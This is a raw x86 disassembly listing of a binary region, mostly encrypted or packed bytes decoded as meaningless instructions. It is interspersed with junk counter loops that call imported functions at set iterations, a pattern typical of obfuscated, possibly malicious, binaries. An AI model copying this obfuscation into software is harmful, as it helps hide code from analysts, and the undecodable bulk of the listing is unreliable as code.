  40e11a:	mov    bh,0xf1
  40e11c:	fstp   DWORD PTR [ecx-0x7a972fbc]
  40e122:	add    DWORD PTR [ebx],ebp
  40e124:	push   0xc37070a6
  40e129:	jg     0x40e19b
  40e12b:	jo     0x40e0e0
  40e12d:	sub    dh,BYTE PTR [edx]
  40e12f:	cmp    eax,0xa2f9447d
  40e134:	pop    edx
  40e135:	jmp    0x40e0d7
  40e137:	jb     0x40e154
  40e139:	test   DWORD PTR [esi-0x28],ebp
  40e13c:	ds mov al,0xbd
  40e13f:	and    BYTE PTR [ecx-0x44e8a3cc],0xd1
  40e146:	push   esp
  40e147:	mov    eax,ds:0x300733c8
  40e14c:	mov    ebp,0xf7038865
  40e151:	inc    ebp
  40e152:	out    dx,eax
  40e153:	or     BYTE PTR [eax],dh
  40e155:	test   al,0x15
  40e157:	or     al,0xef
  40e159:	mov    ds:0x49f694c8,eax
  40e15e:	mov    ds:0x72fe4fdc,al
  40e163:	mov    ecx,0xe85f58b0
  40e168:	hlt    
  40e169:	add    BYTE PTR [edx-0x65],0x51
  40e16d:	scas   eax,DWORD PTR es:[edi]
  40e16e:	into   
  40e16f:	dec    ebx
  40e170:	adc    ah,bh
  40e172:	data16 faddp st(5),st
  40e175:	mov    ds:0x8f0c1492,al
  40e17a:	rcr    BYTE PTR [edi+0x16a09549],cl
  40e180:	repz bound esi,QWORD PTR [ebx-0x55a74c48]
  40e187:	dec    edi
  40e188:	or     DWORD PTR [edx-0x27e1981a],ecx
  40e18e:	out    0x1e,eax
  40e190:	in     eax,dx
  40e191:	popa   
  40e192:	lea    esi,[ebx-0x61]
  40e195:	call   0x1cac5ec1
  40e19a:	adc    BYTE PTR [ecx+0x18626bea],dl
  40e1a0:	clc    
  40e1a1:	(bad)  
  40e1a3:	fmul   DWORD PTR [esi+eiz*2]
  40e1a6:	aaa    
  40e1a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1a8:	das    
  40e1a9:	push   ebx
  40e1aa:	xor    al,0xaa
  40e1ac:	rcr    DWORD PTR [ecx],cl
  40e1ae:	mov    eax,0xe314988f
  40e1b3:	mov    DWORD PTR [ecx],0x640c8888
  40e1b9:	sbb    BYTE PTR ds:0x27e73393,bl
  40e1bf:	out    dx,eax
  40e1c0:	inc    edi
  40e1c1:	loopne 0x40e16d
  40e1c3:	inc    eax
  40e1c4:	push   0x46
  40e1c6:	leave  
  40e1c7:	ret    
  40e1c8:	dec    ebx
  40e1ca:	(bad)  
  40e1cb:	cwde   
  40e1cc:	sub    al,0x26
  40e1ce:	or     ah,ch
  40e1d0:	ss mov bh,0x7c
  40e1d3:	or     esi,esp
  40e1d5:	loopne 0x40e1bd
  40e1d7:	and    dh,BYTE PTR [eax+0x3fa3283d]
  40e1dd:	jns    0x40e256
  40e1df:	fs rol al,1
  40e1e2:	imul   DWORD PTR [eax+ecx*2]
  40e1e5:	je     0x40e1e7
  40e1e7:	shr    DWORD PTR [eax+ecx*8-0x55],0xfb
  40e1ec:	outs   dx,DWORD PTR ds:[esi]
  40e1ed:	push   cs
  40e1ee:	xchg   esi,eax
  40e1ef:	lock cmp al,0x73
  40e1f2:	pusha  
  40e1f3:	push   0x8c556e5f
  40e1f8:	or     cl,BYTE PTR [ebx]
  40e1fa:	xorps  xmm7,XMMWORD PTR [eax]
  40e1fd:	push   edx
  40e1fe:	xchg   DWORD PTR [ecx-0x6f18adeb],eax
  40e204:	inc    ecx
  40e205:	dec    ecx
  40e206:	aam    0xe
  40e208:	fstp   QWORD PTR [esi-0x326a2535]
  40e20e:	and    DWORD PTR [edi+0x449335c],esp
  40e214:	in     eax,dx
  40e215:	sub    DWORD PTR [edx+0x6],0xffffffbd
  40e219:	jno    0x40e249
  40e21b:	jb     0x40e219
  40e21d:	mov    ch,0x1d
  40e21f:	xor    eax,0x3f4d3fe4
  40e224:	in     al,0x2b
  40e226:	aas    
  40e227:	lods   eax,DWORD PTR ds:[esi]
  40e228:	pusha  
  40e229:	inc    esi
  40e22a:	mov    ebx,0x801bc511
  40e22f:	push   edi
  40e230:	dec    edi
  40e231:	ins    DWORD PTR es:[edi],dx
  40e232:	pusha  
  40e233:	retf   
  40e234:	or     edx,DWORD PTR [edx+0xbb16b3e]
  40e23a:	cmp    eax,0x464ba9e1
  40e23f:	push   esi
  40e240:	pop    ecx
  40e241:	addr16 mov ecx,0xa0442bd6
  40e247:	jb     0x40e1d8
  40e249:	nop
  40e24a:	aad    0x6a
  40e24c:	scas   al,BYTE PTR es:[edi]
  40e24d:	shl    esp,0x42
  40e250:	dec    edi
  40e251:	test   DWORD PTR [eax+0x408d996e],esi
  40e257:	addr16 xor eax,0xbd7a0b38
  40e25d:	ins    DWORD PTR es:[edi],dx
  40e25e:	popf   
  40e25f:	jnp    0x40e240
  40e261:	push   0x39
  40e263:	sub    eax,0x226ed95
  40e268:	(bad)  
  40e269:	mov    edi,0x783f939c
  40e26e:	adc    DWORD PTR [esi+0x4d26781],edi
  40e274:	sbb    al,0x8b
  40e276:	xchg   esi,eax
  40e277:	inc    edx
  40e278:	dec    eax
  40e279:	mov    DWORD PTR [ecx],eax
  40e27b:	lea    eax,[ebp-0x4]
  40e27e:	and    DWORD PTR ds:0x42fc7d,0x0
  40e288:	mov    ecx,DWORD PTR ds:0x42fc7d
  40e28e:	inc    ecx
  40e28f:	mov    DWORD PTR ds:0x42fc7d,ecx
  40e295:	cmp    DWORD PTR ds:0x42fc7d,0x8
  40e29c:	jne    0x40e2b0
  40e2a2:	push   DWORD PTR [ebp-0x14]
  40e2a5:	push   0x5961
  40e2aa:	call   DWORD PTR ds:0x42e4e3
  40e2b0:	cmp    DWORD PTR ds:0x42fc7d,0x7
  40e2b7:	jne    0x40e2ca
  40e2bd:	mov    ecx,DWORD PTR ds:0x42fc7d
  40e2c3:	inc    ecx
  40e2c4:	mov    DWORD PTR ds:0x42fc7d,ecx
  40e2ca:	cmp    DWORD PTR ds:0x42fc7d,0x15
  40e2d1:	jb     0x40e288
  40e2d7:	and    DWORD PTR ds:0x42fcee,0x0
  40e2e1:	jmp    0x40e2f3
  40e2e6:	mov    ecx,DWORD PTR ds:0x42fcee
  40e2ec:	inc    ecx
  40e2ed:	mov    DWORD PTR ds:0x42fcee,ecx
  40e2f3:	cmp    DWORD PTR ds:0x42fcee,0x1b
  40e2fa:	jae    0x40e34c
  40e300:	cmp    DWORD PTR ds:0x42fcee,0x9
  40e307:	jne    0x40e31b
  40e30d:	push   DWORD PTR [ebp-0x28]
  40e310:	push   0x42fc81
  40e315:	call   DWORD PTR ds:0x42e3f7
  40e31b:	cmp    DWORD PTR ds:0x42fcee,0x8
  40e322:	jne    0x40e335
  40e328:	mov    ecx,DWORD PTR ds:0x42fcee
  40e32e:	inc    ecx
  40e32f:	mov    DWORD PTR ds:0x42fcee,ecx
  40e335:	jmp    0x40e2e6
  40e33a:	mov    ebx,DWORD PTR ds:0x42e714
  40e340:	mov    ecx,DWORD PTR ds:0x42e71c
  40e346:	sub    ebx,ecx
  40e348:	imul   ebx,DWORD PTR [ebx+ecx*1]
  40e34c:	mov    DWORD PTR [ebp-0x10],eax
  40e34f:	sub    ecx,ebx
  40e351:	mov    eax,DWORD PTR [ebp+0x8]
  40e354:	and    ebx,ecx
  40e356:	mov    ecx,DWORD PTR [ebp-0x10]
  40e359:	sbb    DWORD PTR ds:0x42fcf2,ecx
  40e35f:	xor    eax,esi
  40e361:	add    eax,edi
  40e363:	mov    DWORD PTR [ecx],eax
  40e365:	jmp    0x40e4cf
  40e36a:	icebp  
  40e36b:	ja     0x40e334
  40e36d:	pop    ds
  40e36e:	inc    ecx
  40e36f:	scas   eax,DWORD PTR es:[edi]
  40e370:	icebp  
  40e371:	jno    0x40e314
  40e373:	push   edi
  40e374:	inc    eax
  40e375:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e376:	pop    ecx
  40e377:	cli    
  40e378:	sub    al,0xe5
  40e37a:	cmp    esp,DWORD PTR [eax+esi*2+0x707fc370]
  40e381:	jo     0x40e3bb
  40e383:	bound  eax,QWORD PTR [edx+ecx*1+0x742d006]
  40e38a:	xchg   esp,eax
  40e38b:	mov    edi,0xe3d93a64
  40e390:	scas   eax,DWORD PTR es:[edi]
  40e391:	rol    BYTE PTR [ebx+0x74],0xf0
  40e395:	pop    edx
  40e396:	pop    esi
  40e398:	cmp    ebx,DWORD PTR [ebp+0x70]
  40e39b:	dec    ebx
  40e39c:	xchg   edx,eax
  40e39d:	cmp    edx,DWORD PTR [esi+edi*2-0x71]
  40e3a1:	cmp    al,0x2d
  40e3a3:	adc    DWORD PTR [ecx-0x51677d7],0xb80cdb12
  40e3ad:	imul   edx,eax,0x74f23663
  40e3b3:	popf   
  40e3b4:	and    edi,DWORD PTR [ebp-0x3cb2bab7]
  40e3ba:	sub    al,0x85
  40e3bc:	das    
  40e3bd:	and    BYTE PTR [eax-0x3f],bh
  40e3c0:	adc    al,0xca
  40e3c2:	pop    edx
  40e3c3:	jmp    0x423b:0xdc04198f
  40e3ca:	pop    esi
  40e3cb:	pop    ebp
  40e3cc:	xchg   esp,eax
  40e3cd:	pop    eax
  40e3ce:	int    0x7e
  40e3d0:	push   cs
  40e3d1:	lahf   
  40e3d2:	xor    DWORD PTR ds:0xa23bc438,edi
  40e3d8:	lahf   
  40e3d9:	inc    esi
  40e3da:	clc    
  40e3db:	jo     0x40e3bd
  40e3dd:	xor    eax,DWORD PTR [ecx+edx*4+0x714e98f9]
  40e3e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e3e5:	xchg   esi,eax
  40e3e6:	xchg   esi,eax
  40e3e7:	daa    
  40e3e8:	add    DWORD PTR [ebx],eax
  40e3ea:	in     eax,dx
  40e3eb:	je     0x40e3d2
  40e3ed:	or     dl,BYTE PTR [ebp-0xb53c06d]
  40e3f3:	sahf   
  40e3f4:	enter  0x9ed5,0x39
  40e3f8:	(bad)  
  40e3f9:	adc    al,0xf8
  40e3fb:	in     eax,0xf
  40e3fd:	test   BYTE PTR [edi+0x7e],dl
  40e400:	xchg   edx,eax
  40e401:	dec    esi
  40e402:	sbb    DWORD PTR [eax+0x3f810475],esp
  40e408:	pop    es
  40e409:	push   es
  40e40a:	sbb    dh,BYTE PTR [ebx]
  40e40c:	pop    esp
  40e40d:	(bad)  
  40e40e:	ds mov al,0x4
  40e411:	add    eax,DWORD PTR [edi-0x3625cd71]
  40e417:	call   0xe873a93f
  40e41c:	scas   eax,DWORD PTR es:[edi]
  40e41d:	aaa    
  40e41e:	push   edi
  40e41f:	adc    cl,BYTE PTR [esi]
  40e421:	mov    eax,0xd870cafa
  40e426:	sti    
  40e427:	push   ss
  40e428:	dec    eax
  40e429:	dec    ebx
  40e42a:	fwait
  40e42b:	push   ebp
  40e42c:	xchg   BYTE PTR [esi],al
  40e42e:	push   ebp
  40e42f:	xchg   edi,eax
  40e430:	and    ch,BYTE PTR [esi]
  40e432:	pop    ss
  40e433:	shr    BYTE PTR [esi+0x7b005bb1],0xd7
  40e43a:	sub    eax,DWORD PTR [ebx+0x3304b815]
  40e440:	jns    0x40e449
  40e442:	push   ebp
  40e443:	dec    esp
  40e444:	(bad)  
  40e445:	(bad)  
  40e446:	mov    ebp,0x9ca25c9b
  40e44b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e44c:	xor    DWORD PTR [edi+eiz*4+0x69d1eeeb],esi
  40e453:	and    ebp,0xffffffb7
  40e456:	(bad)  
  40e457:	cmpxchg8b QWORD PTR [ebx]
  40e45a:	sbb    bl,bl
  40e45c:	imul   esp,ecx,0x625e7db1
  40e462:	enter  0x88e0,0x3c
  40e466:	ficom  DWORD PTR [edx+0x4a]
  40e469:	jmp    0xb7da65a7
  40e46e:	inc    esp
  40e46f:	and    ebp,DWORD PTR [eax+edx*2]
  40e472:	das    
  40e473:	clc    
  40e474:	pop    ecx
  40e475:	jge    0x40e4c4
  40e477:	or     BYTE PTR [eax+0x1d65fa8f],cl
  40e47d:	enter  0xd9f9,0xc0
  40e481:	pop    esp
  40e482:	fsubr  QWORD PTR [ebp+0x7f]
  40e485:	bound  eax,QWORD PTR [edi-0x6ef6a6b4]
  40e48b:	add    eax,0xe3cfba3
  40e490:	cmc    
  40e491:	leave  
  40e492:	sub    DWORD PTR [edi+0x6f5d1f5b],edi
  40e498:	ret    
  40e499:	cmp    al,0xb3
  40e49b:	mov    esp,0xda4b5b5d
  40e4a0:	fist   WORD PTR [ebp+0x2665ac8f]
  40e4a6:	sub    esp,DWORD PTR [edx-0x6f]
  40e4a9:	dec    esi
  40e4aa:	lahf   
  40e4ab:	inc    edx
  40e4ac:	sub    DWORD PTR [ecx+0x28df1cef],edx
  40e4b2:	xchg   edx,eax
  40e4b3:	mov    ch,bh
  40e4b5:	jno    0x40e4b9
  40e4b7:	push   es
  40e4b8:	jnp    0x40e512
  40e4ba:	xchg   DWORD PTR [edi+ebx*1+0x3b],edx
  40e4be:	lods   al,BYTE PTR ds:[esi]
  40e4bf:	add    DWORD PTR [ebx],0x15009c01
  40e4c5:	pop    ds
  40e4c6:	gs mov bl,0x75
  40e4c9:	mov    dl,0x32
  40e4cb:	aas    
  40e4cc:	(bad)  
  40e4cd:	out    dx,al
  40e4ce:	sbb    eax,0x31e845c7
  40e4d3:	test   DWORD PTR [eax+edi*8+0x399ae381],ebx
  40e4da:	add    BYTE PTR [eax],al
  40e4dc:	lea    eax,[ebp-0x18]
  40e4df:	mov    DWORD PTR [ebp-0x24],eax
  40e4e2:	jmp    0x40e64c
  40e4e7:	ror    DWORD PTR [eax+edi*4+0x61f15519],0x74
  40e4ef:	sbb    al,BYTE PTR ds:0x9cca740f
  40e4f5:	adc    bl,dh
  40e4f7:	mov    fs,WORD PTR [ebx+0x7fc37070]
  40e4fd:	jo     0x40e56f
  40e4ff:	ret    0xf827
  40e502:	pop    edx
  40e503:	retf   0x65d4
  40e506:	data16 jno 0x40e49f
  40e509:	push   edi
  40e50a:	fidivr WORD PTR [edi+0x929718b]
  40e510:	(bad)  [esp+ebx*2]
  40e513:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e514:	and    DWORD PTR [esp+edi*1],esp
  40e517:	pop    edi
  40e518:	in     eax,0x45
  40e51a:	nop
  40e51b:	cs mov ebp,0xbca35c6f
  40e521:	cmp    BYTE PTR [ebp-0x26860ddd],dh
  40e527:	or     DWORD PTR [eax],edi
  40e529:	jae    0x40e568
  40e52b:	stos   DWORD PTR es:[edi],eax
  40e52c:	inc    esp
  40e52d:	add    eax,0x14be251f
  40e532:	mov    edx,0xedcb63c5
  40e537:	test   ebx,ebp
  40e539:	mov    dl,0x80
  40e53b:	pop    ss
  40e53c:	ficom  DWORD PTR [eax+ecx*2]
  40e53f:	sbb    ecx,ebp
  40e541:	es das 
  40e543:	lods   eax,DWORD PTR ds:[esi]
  40e544:	xor    bl,BYTE PTR [ebp-0x69]
  40e547:	mov    dh,0x53
  40e549:	push   edx
  40e54a:	popf   
  40e54b:	jmp    0x769da719
  40e550:	fidivr WORD PTR [edi+esi*8-0x1e6cdcf]
  40e557:	cmc    
  40e558:	or     BYTE PTR [ebx+0x9abd366],0x43
  40e55f:	mov    cl,0x21
  40e561:	mov    ds:0xe063f80e,eax
  40e566:	push   edx
  40e567:	xchg   DWORD PTR [eax],eax
  40e569:	and    eax,0x666b862a
  40e56e:	out    0x3f,eax
  40e570:	scas   eax,DWORD PTR es:[edi]
  40e571:	xlat   BYTE PTR ds:[ebx]
  40e572:	repnz xchg esi,eax
  40e574:	fst    DWORD PTR fs:[ebp-0x9]
  40e578:	arpl   WORD PTR [ebp+ebp*1+0x47],sp
  40e57c:	push   ecx
  40e57d:	xchg   bl,ah
  40e57f:	mov    esp,0xfdb8b473
  40e584:	mov    ah,0xa2
  40e586:	push   ss
  40e587:	mov    BYTE PTR [edx],cl
  40e589:	hlt    
  40e58a:	xchg   BYTE PTR [ebp-0x4e],ch
  40e58d:	mov    BYTE PTR [esi-0x77],dl
  40e590:	frstor [ecx-0x6d70ea6b]
  40e596:	std    
  40e597:	mov    ah,BYTE PTR [esp+eiz*8+0x4c]
  40e59b:	mov    esp,0xe29f579a
  40e5a1:	mov    ebp,0xb36b0de4
  40e5a6:	iret   
  40e5a7:	lods   eax,DWORD PTR ds:[esi]
  40e5a8:	xor    ah,BYTE PTR [ecx+0x7e4af297]
  40e5ae:	daa    
  40e5af:	push   0x6b
  40e5b1:	add    eax,ebx
  40e5b3:	mov    ds:0x8d7d282,al
  40e5b8:	dec    esi
  40e5b9:	ins    DWORD PTR es:[edi],dx
  40e5ba:	aaa    
  40e5bb:	das    
  40e5bc:	in     al,0x8a
  40e5be:	repnz mov dl,0x4f
  40e5c1:	sahf   
  40e5c2:	mov    ebx,0xf6f18221
  40e5c7:	xor    ebp,DWORD PTR [edi+0x27]
  40e5ca:	sbb    BYTE PTR [edx+0x209bfe31],ch
  40e5d0:	stc    
  40e5d1:	(bad)  
  40e5d2:	out    0x91,eax
  40e5d4:	jge    0x40e57d
  40e5d6:	jno    0x40e626
  40e5d8:	adc    BYTE PTR [edi+0x27ad21b1],0x7a
  40e5df:	rcr    BYTE PTR [eax],1
  40e5e1:	call   0x651d:0xcba0b899
  40e5e8:	and    al,0x7a
  40e5ea:	call   0x2b95:0x310b2d63
  40e5f1:	mov    esi,0xfe832ca0
  40e5f6:	into   
  40e5f7:	cmp    al,0xc8
  40e5f9:	popw   ss
  40e5fb:	(bad)  
  40e5fd:	dec    ecx
  40e5fe:	std    
  40e5ff:	xor    ch,BYTE PTR [ebx+0x47]
  40e602:	or     BYTE PTR es:[eax+0x12],ah
  40e606:	repnz sbb BYTE PTR ds:0xdc373eb3,ah
  40e60d:	xor    al,0xb5
  40e60f:	(bad)  
  40e610:	push   esi
  40e611:	pushw  cs
  40e613:	fstp   TBYTE PTR [edx+0x3d16bdc0]
  40e619:	loop   0x40e659
  40e61b:	mov    ebx,0x4b2c5a9f
  40e620:	ins    DWORD PTR es:[edi],dx
  40e621:	cwde   
  40e622:	adc    dh,BYTE PTR [eax-0x68]
  40e625:	push   esi
  40e626:	jns    0x40e64f
  40e628:	jb     0x40e621
  40e62a:	daa    
  40e62b:	es dec edx
  40e62d:	sub    esp,DWORD PTR [esi]
  40e62f:	cmp    DWORD PTR [edi-0x19],ebx
  40e632:	fst    DWORD PTR [ebp+0x168ec713]
  40e638:	adc    BYTE PTR [ebp+esi*4-0xc],bh
  40e63c:	(bad)  
  40e63e:	mov    al,0xe0
  40e640:	pop    ds
  40e641:	jle    0x40e6aa
  40e643:	mov    eax,ds:0x282868b3
  40e648:	ret    0x1c44
  40e64b:	(bad)  [ebx+0x2581e845]
  40e651:	cli    
  40e652:	cld    
  40e653:	inc    edx
  40e654:	add    BYTE PTR [eax],al
  40e656:	add    BYTE PTR [eax],al
  40e658:	add    cl,ch
  40e65a:	or     eax,0x8b000000
  40e65f:	sbb    eax,0x42fcfa
  40e664:	inc    ebx
  40e665:	mov    DWORD PTR ds:0x42fcfa,ebx
  40e66b:	cmp    DWORD PTR ds:0x42fcfa,0x1e
  40e672:	jae    0x40e697
  40e678:	cmp    DWORD PTR ds:0x42fcfa,0x24
  40e67f:	jne    0x40e690
  40e685:	push   0x1cae
  40e68a:	call   DWORD PTR ds:0x42e3fb
  40e690:	jmp    0x40e65e
  40e695:	neg    ebx
  40e697:	mov    ecx,DWORD PTR [ebp-0x24]
  40e69a:	add    ebx,0x74bf
  40e6a0:	xor    eax,esi
  40e6a2:	add    eax,edi
  40e6a4:	sub    DWORD PTR ds:0x42e09c,edx
  40e6aa:	mov    DWORD PTR [ecx],eax
  40e6ac:	mov    eax,ds:0x41b27c
  40e6b1:	adc    DWORD PTR ds:0x42fc81,ebx
  40e6b7:	mov    ebx,0x8e12febe
  40e6bc:	mov    DWORD PTR [ebp-0xc],ebx
  40e6bf:	adc    DWORD PTR ds:0x42fc59,0x7944
  40e6c9:	jmp    0x40e833
  40e6ce:	cmp    dl,bl
  40e6d0:	in     al,dx
  40e6d1:	fcomi  st,st(1)
  40e6d3:	jecxz  0x40e69e
  40e6d5:	icebp  
  40e6d6:	xor    al,0x3a
  40e6d8:	iret   
  40e6d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6da:	retf   
  40e6db:	jge    0x40e66b
  40e6dd:	mov    edx,0x7070a251
  40e6e2:	ret    
  40e6e3:	jg     0x40e755
  40e6e5:	jo     0x40e6af
  40e6e7:	inc    edi
  40e6e8:	pop    ecx
  40e6e9:	jb     0x40e69e
  40e6eb:	loop   0x40e716
  40e6ed:	or     dh,BYTE PTR [edi+ebp*1]
  40e6f0:	test   eax,0x6dba276e
  40e6f5:	mov    esi,0x8ea1340
  40e6fa:	inc    esi
  40e6fb:	pop    edi
  40e6fc:	in     eax,0x2f
  40e6fe:	push   ecx
  40e6ff:	jge    0x40e766
  40e701:	inc    edi
  40e702:	sbb    eax,0x819debc3
  40e707:	push   ecx
  40e708:	scas   eax,DWORD PTR es:[edi]
  40e709:	js     0x40e707
  40e70b:	mov    ds:0xb988d0d1,al
  40e710:	stc    
  40e711:	fmul   st(4),st
  40e713:	push   esi
  40e714:	shr    BYTE PTR es:[ecx+0x59f7ae44],cl
  40e71b:	add    BYTE PTR [esi],ch
  40e71d:	jae    0x40e713
  40e71f:	rcr    esp,1
  40e721:	mov    cs:0x54be3fa3,al
  40e727:	arpl   WORD PTR [edi],bx
  40e729:	jmp    0x40e6e1
  40e72b:	call   0xb4b9:0x652f97e4
  40e732:	scas   al,BYTE PTR es:[edi]
  40e733:	jnp    0x40e6cf
  40e735:	ja     0x40e6ed
  40e737:	xor    eax,0xadbede34
  40e73c:	pop    eax
  40e73d:	bound  ecx,QWORD PTR [ecx+0x1a]
  40e740:	push   eax
  40e741:	fdivr  st(3),st
  40e743:	jp     0x40e747
  40e745:	test   DWORD PTR [ecx-0x488d5493],esi
  40e74b:	cdq    
  40e74c:	xchg   edx,eax
  40e74d:	(bad)
  40e750:	retf   0xf145
  40e753:	mov    edi,0xd3fe5530
  40e758:	imul   edi,DWORD PTR [edi],0x5f640faa
  40e75e:	or     al,0x85
  40e760:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e761:	pop    ecx
  40e762:	or     BYTE PTR [esi+0x75a22feb],dl
  40e768:	add    dh,BYTE PTR [esi-0x78]
  40e76b:	mov    edx,0x7b3ca91a
  40e770:	push   0x7
  40e772:	sub    al,0x3b
  40e774:	jge    0x40e7db
  40e776:	imul   BYTE PTR [eax-0x3c8542d5]
  40e77c:	in     al,dx
  40e77d:	in     al,dx
  40e77e:	xchg   edx,eax
  40e77f:	pop    ecx
  40e780:	cmp    al,0x72
  40e782:	jne    0x40e7f8
  40e784:	jno    0x40e7e3
  40e786:	push   eax
  40e787:	test   DWORD PTR [ecx-0x40],ebx
  40e78a:	inc    esi
  40e78b:	je     0x40e785
  40e78d:	cmp    BYTE PTR [ebx],bh
  40e78f:	mov    bh,BYTE PTR [ebx-0x12114a8c]
  40e795:	icebp  
  40e796:	and    dl,BYTE PTR [esp+edi*2-0x2e885ded]
  40e79d:	pop    ebp
  40e79e:	das    
  40e79f:	ds or  edi,ebp
  40e7a2:	xor    al,0x96
  40e7a4:	jl     0x40e746
  40e7a6:	push   ds
  40e7a7:	inc    edx
  40e7a8:	push   ecx
  40e7aa:	mov    ds:0x8ccce81f,eax
  40e7af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7b0:	jbe    0x40e7ca
  40e7b2:	inc    ebp
  40e7b3:	test   al,0xd6
  40e7b5:	lahf   
  40e7b6:	cli    
  40e7b7:	inc    eax
  40e7b8:	sub    bl,0xd5
  40e7bb:	jg     0x40e7e9
  40e7bd:	dec    eax
  40e7be:	pushw  0xaa6
  40e7c2:	shr    al,0x5
  40e7c5:	add    eax,0x476519e1
  40e7ca:	outs   dx,BYTE PTR ds:[esi]
  40e7cb:	pop    ds
  40e7cc:	push   esp
  40e7cd:	hlt    
  40e7ce:	mov    cs,WORD PTR [ecx]
  40e7d0:	sbb    cl,BYTE PTR [esi]
  40e7d2:	sub    cl,BYTE PTR [edx]
  40e7d4:	scas   eax,DWORD PTR es:[edi]
  40e7d5:	and    eax,0x6e4a4d87
  40e7da:	arpl   WORD PTR [edx+0x430055c4],sp
  40e7e0:	push   esi
  40e7e1:	dec    edi
  40e7e2:	mov    dh,0x57
  40e7e4:	dec    ecx
  40e7e5:	jno    0x40e7ae
  40e7e7:	or     ch,BYTE PTR [edx-0xa]
  40e7ea:	jno    0x40e7e3
  40e7ec:	xlat   BYTE PTR ds:[ebx]
  40e7ed:	mov    ebx,?
  40e7ef:	std    
  40e7f0:	mov    ch,0x1
  40e7f2:	add    BYTE PTR [ebx],ch
  40e7f4:	xchg   ebp,eax
  40e7f5:	hlt    
  40e7f6:	adc    esi,eax
  40e7f8:	(bad)  
  40e7f9:	stc    
  40e7fa:	lahf   
  40e7fb:	scas   eax,DWORD PTR es:[edi]
  40e7fc:	jno    0x40e83b
  40e7fe:	imul   eax,DWORD PTR [esi-0x3e2db10a],0x442ac162
  40e808:	psadbw mm1,QWORD PTR [ebx-0x7cfa38f6]
  40e80f:	pushf  
  40e810:	retf   
  40e811:	sub    DWORD PTR [esp+eax*8],0x6b68309
  40e818:	jmp    0x9278ebb9
  40e81d:	push   esi
  40e81e:	mov    bl,0x3a
  40e820:	add    BYTE PTR [eax],cl
  40e822:	sbb    BYTE PTR [edi],dl
  40e824:	test   al,0x45
  40e826:	jmp    0x50b9:0x6b12e17d
  40e82d:	scas   al,BYTE PTR es:[edi]
  40e82e:	fistp  WORD PTR [ebx-0x74a109c1]
  40e834:	add    BYTE PTR [ecx+0x42fc6915],al
  40e83a:	add    BYTE PTR [edi+0x50],ah
  40e83d:	add    BYTE PTR [eax],al
  40e83f:	mov    cx,WORD PTR [ebp-0x4]
  40e843:	xor    DWORD PTR ds:0x42fc8d,0x42fcfe
  40e84d:	movzx  ecx,cx
  40e850:	add    ecx,DWORD PTR [eax]
  40e852:	neg    eax
  40e854:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40e85b:	sbb    eax,0x5a1e
  40e860:	mov    DWORD PTR [ebp-0x1c],ecx
  40e863:	mov    eax,DWORD PTR [ebp+0x8]
  40e866:	sbb    ecx,DWORD PTR ds:0x42fc61
  40e86c:	mov    ecx,DWORD PTR [ebp-0x8]
  40e86f:	xor    DWORD PTR ds:0x42e09c,0x42e66f
  40e879:	xor    eax,esi
  40e87b:	and    DWORD PTR ds:0x42e68b,0x57ad
  40e885:	add    eax,edi
  40e887:	cmp    DWORD PTR [ecx],eax
  40e889:	jne    0x40efe4
  40e88f:	and    DWORD PTR ds:0x42fc51,0x0
  40e899:	jmp    0x40e8ab
  40e89e:	mov    ecx,DWORD PTR ds:0x42fc51
  40e8a4:	inc    ecx
  40e8a5:	mov    DWORD PTR ds:0x42fc51,ecx
  40e8ab:	cmp    DWORD PTR ds:0x42fc51,0x11
  40e8b2:	jae    0x40e8fe
  40e8b8:	cmp    DWORD PTR ds:0x42fc51,0x8
  40e8bf:	jne    0x40e8d0
  40e8c5:	push   0x42e167
  40e8ca:	call   DWORD PTR ds:0x42e3ff
  40e8d0:	cmp    DWORD PTR ds:0x42fc51,0x7
  40e8d7:	jne    0x40e8ec
  40e8dd:	xor    ecx,ecx
  40e8df:	add    ecx,DWORD PTR ds:0x42fc51
  40e8e5:	inc    ecx
  40e8e6:	mov    DWORD PTR ds:0x42fc51,ecx
  40e8ec:	jmp    0x40e89e
  40e8f1:	movzx  ecx,BYTE PTR ds:0x42fd0a
  40e8f8:	adc    DWORD PTR ds:0x42e67f,ecx
  40e8fe:	mov    eax,DWORD PTR [ebp+0x8]
  40e901:	xor    DWORD PTR ds:0x42e677,0x70e3
  40e90b:	mov    ecx,DWORD PTR [ebp-0x1c]
  40e90e:	and    DWORD PTR ds:0x42e67b,0x42e66f
  40e918:	xor    eax,esi
  40e91a:	not    DWORD PTR ds:0x42fc81
  40e920:	add    eax,edi
  40e922:	mov    DWORD PTR ds:0x42fc8d,0x37d2
  40e92c:	cmp    DWORD PTR [ecx],eax
  40e92e:	mov    DWORD PTR ds:0x42e68b,0x263d
  40e938:	jmp    0x40eaa2
  40e93d:	(bad)  
  40e93e:	(bad)  
  40e93f:	fistp  DWORD PTR [ebx+0x65445961]
  40e945:	shl    BYTE PTR [edi-0x39],0x63
  40e949:	mov    ebp,0x24f340c0
  40e94e:	mov    al,ds:0x7fc37070
  40e953:	jo     0x40e9c5
  40e955:	leave  
  40e956:	in     eax,dx
  40e957:	and    DWORD PTR [ecx-0x73],edi
  40e95a:	xchg   esi,eax
  40e95b:	jecxz  0x40e978
  40e95d:	sub    esp,DWORD PTR [ecx]
  40e95f:	out    dx,eax
  40e960:	jb     0x40e9b0
  40e962:	ins    BYTE PTR es:[edi],dx
  40e963:	stos   DWORD PTR es:[edi],eax
  40e964:	rcr    BYTE PTR [ecx-0x716ebe13],cl
  40e96a:	and    DWORD PTR [ecx-0x68],esp
  40e96d:	pop    ebp
  40e96e:	pusha  
  40e96f:	(bad)  
  40e970:	in     al,dx
  40e971:	test   BYTE PTR [ebx-0x3e],bl
  40e974:	mov    dl,0x8f
  40e976:	ins    DWORD PTR es:[edi],dx
  40e977:	or     esp,DWORD PTR [ebp+0x7f]
  40e97a:	mov    DWORD PTR ds:0x31d133b2,ecx
  40e980:	mov    cl,0xf0
  40e982:	mov    ebx,0x9825f4b
  40e987:	adc    al,BYTE PTR [ecx]
  40e989:	sahf   
  40e98a:	mov    ebx,0x8921e934
  40e98f:	into   
  40e990:	call   0xb640:0xff62006e
